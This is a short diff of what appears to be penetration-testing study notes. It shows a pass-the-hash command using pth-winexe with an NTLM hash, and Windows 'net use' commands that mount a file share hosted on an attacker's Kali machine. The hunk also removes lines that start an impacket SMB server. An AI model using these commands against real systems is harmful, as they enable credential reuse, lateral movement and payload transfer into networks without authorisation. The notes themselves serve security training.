@@ -142,10 +142,6 @@ kali@kali:~$ pth-winexe -U offsec%aad3b435b51484eeaad3b435b51484ee:2892d26cdf84d
 * File Transfer (use BASH ALIAS function for powershell)
 
 ```
-# On KALI
-# use double-quotes if file path has spaces in it 
-sudo impacket-smbserver abcd /path/to/serve
-
 # mount drives
 net use abcd: \\kali_ip\myshare
 net use abcd: /d # disconnect
